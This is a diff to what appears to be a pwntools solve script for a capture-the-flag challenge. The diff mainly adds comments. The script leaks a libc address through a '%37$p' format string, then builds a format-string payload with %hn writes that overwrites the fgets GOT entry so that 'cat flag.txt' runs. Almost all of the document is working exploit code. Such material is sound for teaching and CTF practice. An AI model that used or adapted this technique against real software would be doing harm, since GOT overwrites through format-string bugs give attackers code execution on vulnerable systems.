@@ -16,9 +16,9 @@ libc = ELF("./libc.so.6")
 system_libc_offset = libc.symbols["system"]
 fgets_libc_offset = libc.symbols["fgets"]
 
-got_fgets = 0x404010
+got_fgets = 0x404010                                    # Since the PIE isn't active, it will be static
 
-conn.sendlineafter(b"> ", b"%37$p")                  # Use one of the useful address previously obtained
+conn.sendlineafter(b"> ", b"%37$p")                     # Use one of the useful address previously obtained
 leak = int(conn.recvline(keepends=False), 16)
 
 # What comes after the - was obtained using info symbols <addr>
@@ -47,15 +47,15 @@ payload = b"cat flag.txt    "
 
 if(char_to_print_ms > char_to_print_ls):        # First we write the ls, then the ms
     payload += (f"%{(char_to_print_ls - len(payload))}c%12$hn").encode()        # Remove the char already printed
-    payload += (f"%{(char_to_print_ms - char_to_print_ls)}c%13$hn").encode()
+    payload += (f"%{(char_to_print_ms - char_to_print_ls)}c%13$hn").encode()    
     payload += b" " * (8 - len(payload)%8)                                      # Makes the payload size multiple of 8
-    payload += p64(got_fgets)                                                   # The two addressess we will print to
+    payload += p64(got_fgets)                                                   # The two addressess we will print to: the GOT entry for the fgets function
     payload += p64(got_fgets + 2)
 else:                                           # Otherwise, swap the two
-    payload += (f"%{(char_to_print_ms - len(payload))}c%12$hn").encode()
-    payload += (f"%{(char_to_print_ls - char_to_print_ms)}c%13$hn").encode()
+    payload += (f"%{(char_to_print_ms - len(payload))}c%12$hn").encode()        # The 12$ and 13$ derives from the position of the two addresses, that are
+    payload += (f"%{(char_to_print_ls - char_to_print_ms)}c%13$hn").encode()    # on the 12th and 13th position on the stack
     payload += b" " * (8 - len(payload)%8)
-    payload += p64(got_fgets + 2)                                               # Having swapped the pieces, we also swap the addresses
+    payload += p64(got_fgets + 2)                                               # Having swapped the order of the pieces, we also swap the addresses
     payload += p64(got_fgets)
 
 print(payload)
